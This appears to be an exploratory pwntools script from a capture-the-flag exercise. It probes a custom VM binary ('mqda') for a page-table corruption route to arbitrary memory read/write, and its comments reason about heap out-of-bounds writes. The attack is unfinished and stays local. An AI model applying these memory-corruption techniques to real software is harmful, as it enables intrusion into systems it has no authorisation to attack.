#!/usr/bin/env python3
"""
Exploit: Corrupt page table to get arbitrary read/write

The VM state structure is on the stack:
- offset 0x00: page_table pointer (8 bytes)
- offset 0x08: IP (4 bytes)
- offset 0x0c: flags (4 bytes)
- offset 0x10: registers (16 * 4 = 64 bytes)

If we can corrupt the page table pointer, we can make the VM
access arbitrary memory as if it were VM pages!

The question is: can we reach the stack from heap corruption?
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def main():
    print("[*] Analyzing attack surface for page table corruption...")
    
    # The page table is stored in the vm_state structure on the stack
    # We can't directly corrupt the stack from heap overflow
    
    # But... what if we can corrupt a PAGE TABLE ENTRY?
    # Page tables are also malloc(0x800) chunks!
    
    # If we can get a data page adjacent to a page table chunk,
    # we might be able to corrupt a page table entry with OOB write
    
    # However, the OOB write only corrupts prev_size, not the data
    
    # Alternative: what if the ORDER of allocations matters?
    # If code address is very high, it might allocate many page table chunks
    
    # Let me test with a high code address
    code = b''
    code += mov_reg_imm(15, 0x00)
    code += mov_reg_imm(0, 0x41414141)
    code += push_reg(0)
    code += hlt()
    
    # Load code at a high address to force many page table allocations
    high_addr = 0xFFFF0000
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(str(high_addr).encode())
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(str(high_addr).encode())
    
    output = p.recvall(timeout=2)
    print(f"[*] Output: {output}")
    p.close()

if __name__ == '__main__':
    main()
